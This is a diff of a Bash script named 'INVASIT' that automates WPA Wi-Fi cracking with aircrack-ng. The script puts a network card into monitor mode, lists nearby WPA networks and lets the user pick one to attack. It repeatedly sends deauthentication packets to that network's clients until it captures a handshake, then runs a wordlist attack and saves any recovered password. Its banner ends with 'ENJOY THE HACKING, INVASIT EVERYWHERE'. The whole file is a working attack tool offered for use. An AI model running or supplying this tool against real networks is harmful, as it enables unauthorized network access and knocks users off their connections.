@@ -4,29 +4,36 @@
 
 ################## SHORTCUTS/STUFFS ##########################
 
-# Air family
+# Deauth time for aireplay-ng
 deauthtime=15
+
+# Create auxiliar folders for handshake/password
 mkdir -p handshakes
 mkdir -p passwords
+
+# Simple usage of airodump just to see all hosts
 function airodumpall {
 	xterm -title "FIND YOUR TARGET" $CENTER -e airodump-ng -a --encrypt WPA $nic -w target -o kismet
 }
 
+# This function capture the specific network data
 function airodumpscanclients {
 	xterm -title "SCANNING $networkname NETWORK " $TOPRIGHTBIG -e airodump-ng -a --bssid $bssidtarget -c $channel,$channel -w $name --output-format csv,cap $nic &
 }
 
+# This is the function the deauthenticate the clients of the network
 function deauthesp {
 	xterm -title "DEAUTHENTICATING CLIENTS" $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -e aireplay-ng -0 $deauthtime -a $bssidtarget -c $bssidclient --ignore-negative-one $nic &
 }
 
+# Kill aircrack-ng family & xterm processes
 function killeverybody {
-# Kill air & xterm processes useless
 	killall aireplay-ng &>/dev/null
 	killall airodump-ng &>/dev/null
 	killall xterm &>/dev/null			
 }
 
+# Refresh clients mac table everytime a new user is added
 function getclients {
 nr=0
 	while [ $nr = 0 ]; do
@@ -36,7 +43,7 @@ nr=0
 }
 
 # Time for most functions
-st='0.5'
+st='0.3'
 
 # Colors for echo
 RED='\033[0;31m'
@@ -47,11 +54,12 @@ WHITE='\033[1;37m'
 NC='\033[0m'
 
 # user @ machine # shortchut
-userpath="echo -n -e `whoami`@`hostname`:`pwd`#\t\b"
+userpath="`whoami`@`hostname`:`pwd`#"
 
 # Precautions
 trap ctrl_c INT
 function ctrl_c(){
+	echo -e "${NC}\n"
 	END
 }
 
@@ -142,14 +150,13 @@ esac
 INTRO
 }
 
-
 ######################### START ##############################
 
 # INTRODUCTION
 function INTRO {
 clear
 echo ""
-echo -e "	${YELLOW}I  NN       N  V             V  A         SSSSSSSS  I  TTTTTTTTT"
+echo -e "	${GREEN}I  NN       N  V             V  A         SSSSSSSS  I  TTTTTTTTT"
 sleep $st
 echo -e "	I  N N      N   V           V  A A        S         I      T"
 sleep $st
@@ -157,7 +164,7 @@ echo -e "	I  N  N     N    V         V  A   A       S         I      T"
 sleep $st
 echo -e "	I  N   N    N     V       V  A     A      SSSSSSSS  I      T"
 sleep $st
-echo -e "	I  N    N   N      V     V  AAAAAAAAA            S  I      T"
+echo -e "	${YELLOW}I  N    N   N      V     V  AAAAAAAAA            S  I      T"
 sleep $st
 echo -e "	I  N     N  N       V   V  A         A           S  I      T"
 sleep $st
@@ -165,94 +172,135 @@ echo -e "	I  N      N N        V V  A           A          S  I      T"
 sleep $st
 echo -e "	I  N       NN         V  A             A  SSSSSSSS  I      T${NC}"
 sleep $st
-echo ""
-echo -e "	${BLUE}v1${NC} / ${GREEN}by: valvesss${NC} / ${RED}support: sleepyhollow.lockwood@protonmail.ch${NC}"
+echo -e "								${RED}v1.2${NC}"
 MONMODE
 }
 
-# 1) Create NIC mon0
+#######################
+# 1) Create NIC mon0. #
+
 function MONMODE {
+
+	nic=mon0
+
 # Kill all process the could couse trouble to aircrack family
-airmon-ng check kill &> /dev/null &
-nic=mon0
-nicreal=$(iwconfig 2> /dev/null | awk 'NR==1{print $1}')
-if `iw dev | grep -q $nic`; then
-	ifconfig mon0 up 2> /dev/null
-	GERTAB
-else
-	iw dev $nicreal interface add $nic type monitor 2> /dev/null
-	ifconfig mon0 up 2> /dev/null
-	GERTAB
-fi
-}
 
-# 2) Generate table with all WPA networks found
-function GERTAB {
-echo -e "\n# 1) When you find the target network, press CTRL+C.  #"
-airodumpall
-name=target
-EDTCHN
-}
+	read -e -p $'\x0a# Select the network card you want to use [enter for wlan0]: ' nicreal
+		
+	while ! iwconfig 2>/dev/null | grep -w -q $nicreal ; do
+		read -e -p $'\x0a# Sorry, this network card don\'t exist, try again: ' nicreal
+	done
 
-# 3) Edit airodump output in a human readable way and choose network
-function EDTCHN {
-if [ ! -f $name-01.kismet.csv ]; then
-	echo -e "\n# File not found, rescaning... #"
-	rm -rf $name*.kismet.csv
-	airodumpall
-fi
-echo -e "\n# 2) Select the network you want to attack [1,2,3...N]: #\n"
-# Output edit
-cat target-01.kismet.csv | cut -d ';' -f1,4,6,22 | sed 's/;/ /g' | sed 's/BestQuality/-dB/g'| column -t > auxfile1
-cat target-01.kismet.csv | cut -d ';' -f3 > auxfile2
-# Choose network
-paste -d " " auxfile1 /dev/null auxfile2 > auxfile3
-echo "-------------------------------------------------------------------"
-cat auxfile3
-echo "^------------------------------------------------------------------"
-read num
-let num=num+1
-# Based on users option, get the host: mac, channel and name.
-bssidtarget=$(cat auxfile3 | awk -v aux=$num 'NR==aux {print $2}')
-channel=$(cat auxfile3 | awk -v aux=$num 'NR==aux {print $3}')
-networkname=$(cat auxfile3 | awk -v aux=$num 'NR==aux' | tr -s ' ' | cut -d ' ' -f5-8 | tr -d "[:blank:]")
-rm -rf auxfile*
-rm -rf $name-01.kismet.csv
-name=$networkname"_"$bssidtarget
-# If it found a useful handshake, advance some steps.
-	if [ -f ./handshakes/$name-handshake.cap ]; then
-		if `aircrack-ng ./handshakes/$name-handshake.cap | egrep -q '0 handshake|0 packets|No networks'` ; then
-			ESPSCN
-		else		
-			echo -e "\n# Handshake for this network found at: #"
-			realpath $name-hanshake.cap
-			echo -e "\n# Use it? [y/n] #"
-			read opt
-				if [ $opt = "y" ] || [ $opt = "Y" ]; then
-					WORDLIST
-				fi	
-		fi
-	else
-		ESPSCN
+	if [ -z "$nicreal" ] ; then
+		nicreal=wlan0
+		airmon-ng check kill &> /dev/null &
 	fi
+
+# Check if exist the mon0 nic, else, create and activate
+
+	if `iw dev | grep -q $nic`; then
+		ifconfig mon0 up 2> /dev/null
+		GERTAB
+	else
+		iw dev $nicreal interface add $nic type monitor 2> /dev/null
+		ifconfig mon0 up 2> /dev/null
+		GERTAB
+	fi
+
 }
 
-# 4) Scan especific network to get clients
+##################################################
+# 2) Generate table with all WPA networks found. #
+
+function GERTAB {
+
+	echo -e "\n# 1) When you find the target network, press CTRL+C.  #"
+	airodumpall
+	name=target
+	EDTCHN
+
+}
+
+#######################################################################
+# 3) Edit airodump output in a human readable way and choose network. #
+
+function EDTCHN {
+
+	if [ ! -f $name-01.kismet.csv ]; then
+		echo -e "\n# File not found, rescaning... #"
+		rm -rf $name*.kismet.csv
+		airodumpall
+	fi
+
+# Output edit
+
+# The most itens
+
+	cat target-01.kismet.csv | cut -d ';' -f1,4,6,22 | sed 's/;/ /g' | sed 's/BestQuality/-dB/g'| column -t > auxfile1
+
+# The network name
+
+	cat target-01.kismet.csv | cut -d ';' -f3 > auxfile2
+
+# Choose network
+
+	paste -d " " auxfile1 /dev/null auxfile2 > auxfile3
+	echo -e "\n--------------------------------------------------------------"
+	cat auxfile3
+	echo -e "^-------------------------------------------------------------\n"
+	read -e -p "# 2) Select the network you want to attack [1,2,3...N]: " num
+	let num=num+1
+
+# Based on users option, get the host: mac, channel and name
+
+	bssidtarget=$(cat auxfile3 | awk -v aux=$num 'NR==aux {print $2}')
+	channel=$(cat auxfile3 | awk -v aux=$num 'NR==aux {print $3}')
+	networkname=$(cat auxfile3 | awk -v aux=$num 'NR==aux' | tr -s ' ' | cut -d ' ' -f5-8 | tr -d "[:blank:]")
+	rm -rf auxfile*
+	rm -rf $name-01.kismet.csv
+	name=$networkname"_"$bssidtarget
+
+# If it found a useful handshake, advance some steps
+
+	if [ -f ./handshakes/$name-handshake.cap ]; then
+		echo -e "\n# Handshake for this network found at: #"
+		realpath $name-hanshake.cap
+		read -e -p $'\x0a# Use it? [y/n]: ' opt
+			if [ $opt = "y" ] || [ $opt = "Y" ]; then
+				WORDLIST
+			fi	
+	fi
+	ESPSCN
+}
+
+#############################################
+# 4) Scan especific network to get clients. #
+
 function ESPSCN {
+
 # Start airodump at the target 
-airodumpscanclients
-mac=$name.lst
-	# Wait untils csv to be generated
+
+	airodumpscanclients
+	mac=$name.lst
+
+# Wait untils csv to be generated
+
 	while [ ! -f $name-01.csv ]; do
 		:
 	done
-ATTAIR
+
+	ATTAIR
 }
 
-# 5) Attack network using aireplay-ng
+########################################
+# 5) Attack network using aireplay-ng. #
+
 function ATTAIR {
-echo -e "\n# 3) Scanning $networkname to get the HANDSHAKE. #"
+
+	echo -e "\n# 3) Scanning $networkname to get the HANDSHAKE. #"
+
 # Attack clients host until find handshake packet
+
 	while `aircrack-ng $name-01.cap | egrep -q '0 handshake|0 packets|No networks' &>/dev/null` ; do
 		getclients	
 		while [ $nr -gt 0 ]; do
@@ -262,41 +310,55 @@ echo -e "\n# 3) Scanning $networkname to get the HANDSHAKE. #"
 			sleep 5
 		done
 	done
-# Clean handshake packet and erase the behavior
-	wpaclean ./handshakes/$name-handshake.cap ./handshakes/$name-01.cap &> /dev/null
-	rm -rf ./handshakes/$name-01.cap
-# Finish useless process
-	mv $name-01.cap ./handshakes
+
+# Clean handshake packet and erase the previous version of .cap
+
+	wpaclean ./handshakes/$name-handshake.cap $name-01.cap &> /dev/null
+	rm -rf $name-01.cap
+
+# Finish useless process (xterm, aicrack family)
+
 	killeverybody
+
 # Delete MAC clients table if all right
+
 	rm -rf $mac
 	WORDLIST
+
 }
 
-# 6) Search wordlist and verify if don't exist
+#################################################
+# 6) Search wordlist and verify if don't exist. #
+
 function WORDLIST {
-echo -e "\n# 4) Type the wordlist full path: #" 
-$userpath
-read -e path
-a=0
-while [ $a -eq 0  ]
-do
-	if [ !  -f $path ]; then
-		echo -e "\n# Wordlist not found, try again: #"
-		$userpath
-		read -e path
-	else
-		a=1
-	fi
-done
-AIRCRACK
+
+	read -e -p $'\x0a# 4) Type the wordlist full path: #\x0a'"$userpath " path 
+
+# Verify if the wordlist exist 
+
+	a=0
+	while [ $a -eq 0  ]; do
+		if [ !  -f $path ]; then
+			read -e -p $'\0xa# Wordlist not found, try again: #\x0a'"$userpath " path
+		else
+			a=1
+		fi
+	done
+
+	AIRCRACK
 }
 
-# 7) Decryptograph the password
+##################################
+# 7) Decryptograph the password. #
+
 function AIRCRACK {
+
 # Start the wordlist method attack
-aircrack-ng ./handshakes/$name-handshake.cap -w $path | tee $name-passwd.txt
+
+	aircrack-ng ./handshakes/$name-handshake.cap -w $path | tee $name-passwd.txt
+
 # Get the password name if works
+
 	if `cat $name-passwd.txt | grep -q "KEY FOUND"` ; then
 		cat $name-passwd.txt | grep "KEY FOUND" | awk 'NR==1{print $4}' > $name-password.txt
 		mv $name-password.txt passwords/
@@ -304,45 +366,72 @@ aircrack-ng ./handshakes/$name-handshake.cap -w $path | tee $name-passwd.txt
 	else
 		rm -rf $name-passwd.txt
 	fi
+
 # Notice if sucess or not
-	if [ -s $name-password.txt ]; then
-		echo -e "\n# Sucess !! The password is: ${RED} `cat $name-password.txt` ${NC} !!! #\n"
+
+	if [ -s ./passwords/$name-password.txt ]; then
+		echo -e "\n# Sucess !! The password is: ${BLUE} `cat ./passwords/$name-password.txt` ${NC} !!! #\n"
 	else
-		echo -e "\n# Sad news but... This wordlist haven't the password =/... Try again with a new one? [y/n] #"
-		read opt 2>/dev/null
+		read -e -p $'\x0a# Sad news but... This wordlist haven\'t the password =/... Try again with a new one? [y/n] #' opt
 		if [ $opt = "y" ] || [ $opt = "Y" ]; then
 			WORDLIST
 		else
 			END
 		fi			
 	fi	
-# To prevent that aircrack-ng finish the script by itfself
-read -p "# To finish, press ENTER... #"
-END
+
+# To prevent that aircrack-ng finish the script by itself
+
+	read -p $'To finish, press ENTER... \x0a'
+	END
+
 }
 
-# 8) Reinicialize network services and delete the nic created
+################################################################
+# 8) Reinicialize network services and delete the nic created. #
+
 function END {
-echo "[+] Deleting network card if created..."
-if iwconfig 2> /dev/null | grep Monitor &>/dev/null; then
-	iw dev $nic del
-fi
-sleep $st
-echo "[+] Deleting jerk files if exist..."
-rm -rf $name-01.csv &>/dev/null
-rm -rf $name-01.cap &>/dev/null
-rm -rf $name.lst &>/dev/null
-rm -rf target-0*
-sleep $st
-echo "[+] Restarting network services..."
-service NetworkManager restart
-service networking restart
-sleep $st
-echo "[+] Thanks for using!"
-sleep $st
-echo -e "\n${NC}############################################################"
-echo -e "##	${GREEN}ENJOY THE HACKING, ${RED}I N V A S I T ${GREEN}EVERYWHERE${NC}	  ##"
+
+	# Delete the mon0 network
+
+	echo "[+] Deleting network card if created..."
+
+	if iwconfig 2> /dev/null | grep Monitor &>/dev/null; then
+		iw dev $nic del &>/dev/null
+	fi
+
+	sleep $st
+
+	# Delete the files used in the process (now useless)
+
+	echo "[+] Deleting jerk files if exist..."
+	rm -rf $name-01.csv &>/dev/null
+	rm -rf $name-01.cap &>/dev/null
+	rm -rf $name.lst &>/dev/null
+	rm -rf target-0* &>/dev/null
+	rm -rf $name-passwd.txt &>/dev/null
+	sleep $st
+
+	# Restart the network services by two ways
+
+	echo "[+] Restarting network services..."
+	service NetworkManager restart
+	service networking restart
+	sleep $st
+
+	# Thanks!
+
+	echo "[+] Thanks for using!"
+	sleep $st
+
+# Last logo message
+
+echo -e "\n############################################################"
+echo -e "##	${GREEN}ENJOY THE HACKING, ${YELLOW}I N V A S I T ${GREEN}EVERYWHERE${NC}	  ##"
 echo "############################################################"
-exit
+
+# Finish the script
+	exit
+
 }
 setresolution
